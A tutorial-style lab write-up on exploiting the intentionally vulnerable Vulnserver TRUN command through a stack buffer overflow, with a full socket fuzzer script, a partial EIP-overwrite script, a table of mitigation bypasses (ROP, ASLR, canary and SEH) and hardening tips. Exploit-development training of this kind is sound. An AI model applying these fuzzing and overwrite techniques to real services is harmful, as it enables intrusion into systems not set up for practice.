Target Lab Environment

Vulnserver is an intentionally vulnerable Windows TCP service designed for learning binary exploit development. Running on TCP port 9999, it exposes several commands. Among them, the TRUN command processes user-supplied input into a static buffer without bounds checking, triggering a classical stack-based buffer overflow.

LABORATORY CONFIGURATION
  • Target Host: Windows x86 VM — IP 192.168.58.154
  • Service: vulnserver.exe with companion library essfunc.dll listening on Port 9999
  • Attacker Machine: Kali Linux (x86_64)
  • Debugger & Tools: Immunity Debugger with Corelan's mona.py, Metasploit pattern tools (pattern_create, pattern_offset, msfvenom)
  • Exploit Scripts: 1fuzzx1.py, 2fuzzerx2.py, 3pattern.py, 4eip_controler.py, bad_char4.py, final.py

The x86 Stack Frame Model

On x86 32-bit systems, stack memory grows downwards from high addresses to low addresses. When a function executes, its stack frame holds local variables, followed by the Saved Frame Pointer (EBP), and the crucial Saved Return Address (EIP).

Step 1: Fuzzing & Crash (1fuzzx1 / 2fuzzerx2)

Our goal during the fuzzing phase is to determine the approximate buffer length that triggers an unhandled memory exception in vulnserver.exe. We use an incremental socket fuzzer sending TRUN commands with 100-byte increments.

PYTHON 3 · 1fuzzx1.py 
#!/usr/bin/env python3
"""
Buffer Overflow Fuzzer for VulnServer
Purpose: Send increasing buffer sizes to crash the application
and determine approximate crash point
"""

import socket
import sys
import time

# Target Configuration
TARGET_IP = "192.168.58.154"    # Windows machine running VulnServer
TARGET_PORT = 9999              # Default VulnServer port
VULN_COMMAND = "TRUN"           # Vulnerable command

# Starting buffer size and increment
buffer = b"A" * 100             # Start with 100 A's
increment = 100                 # Increase by 100 bytes each iteration

print(f"[*] Starting fuzzer against {TARGET_IP}:{TARGET_PORT}")
print(f"[*] Testing command: {VULN_COMMAND}")
print(f"[*] Starting buffer size: {len(buffer)} bytes")
print(f"[*] Increment: {increment} bytes\n")

while True:
    try:
        print(f"[+] Sending buffer of {len(buffer)} bytes...", end=" ")
        
        # Create socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)  # 5 second timeout
        s.connect((TARGET_IP, TARGET_PORT))
        
        # Receive banner
        s.recv(1024)
        
        # Send the payload
        payload = f"{VULN_COMMAND} .".encode() + buffer
        s.send(payload)
        
        # Close connection
        s.close()
        
        print("OK")
        
        # Increase buffer for next iteration
        buffer += b"A" * increment
        
        # Small delay to let server recover
        time.sleep(1)
        
    except socket.timeout:
        print(f"\n[!] Connection timed out at {len(buffer)} bytes")
        print(f"[!] VulnServer might have crashed!")
        break
        
    except ConnectionRefusedError:
        print(f"\n[!] Connection refused at {len(buffer)} bytes")
        print(f"[!] VulnServer crashed at approximately {len(buffer)} bytes")
        break
        
    except Exception as e:
        print(f"\n[!] Error at {len(buffer)} bytes: {str(e)}")
        print(f"[*] Approximate crash point: {len(buffer)} bytes")
        break

print(f"\n[*] Fuzzing complete. Crash occurred around {len(buffer)} bytes")

Step 3: Controlling EIP (4eip_controler.py)

To mathematically confirm that we hold 100% control over the CPU's execution address, we craft 4eip_controler.py. We write EIP_OFFSET 'A's, followed by four 'B's (0x42424242), followed by a padding of 'C's (0x43434343) to inspect where ESP lands.

PYTHON 3 · 4eip_controler.py 
#!/usr/bin/env python3
"""
EIP Control Verification Script
Purpose: Verify we can control EIP register with exact bytes
"""

import socket
import sys

# Target Configuration
TARGET_IP = "192.168.58.154"
TARGET_PORT = 9999
VULN_COMMAND = "TRUN"

# EIP offset found from pattern_offset.rb
EIP_OFFSET = 2006  # 2006 for 'TRUN .', 2003 for 'TRUN /.:/'

print(f"[*] EIP Control Verification")
print(f"[*] Target: {TARGET_IP}:{TARGET_PORT}")
print(f"[*] EIP Offset: {EIP_OFFSET}")
print(f"[*] EIP value: 0x42424242 (BBBB)\n")

# Build payload
buffer = b"A" * EIP_OFFSET        # Fill up to EIP
eip = b"B" * 4                     # Overwrite EIP with BBBB (0x42424242)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

Modern Defenses & Mitigations

Defense Mechanism Exploitation Bypass Vector
DEP / NX Marks stack and heap non-executable; throws access violation if EIP points there. Return-Oriented Programming (ROP): Chain code gadgets ending in RET or call VirtualProtect().
ASLR Randomizes binary base addresses on boot. Find non-ASLR third-party modules or exploit memory disclosures/format strings.
Stack Canaries (/GS) Puts random integer before saved EBP/EIP; checked before RET. Leak canary via out-of-bounds read or target Structured Exception Handling (SEH).
SafeSEH Validates exception handlers against a static table. Target modules without SafeSEH protection.

Summary & Hardening Takeaways

Stack-based buffer overflows stem from copying user input into fixed-size stack buffers without length verification. Key defensive takeaways:

  • ❌ Replace unsafe C functions (strcpy, strcat, sprintf) with safe alternatives (strncpy_s, snprintf).
  • 🛡️ Enable modern compiler protections: /GS (Buffer Security Check), /DYNAMICBASE (ASLR), and /NXCOMPAT (Data Execution Prevention).
  • 🔍 Conduct regular static code reviews and dynamic fuzzing tests during development.
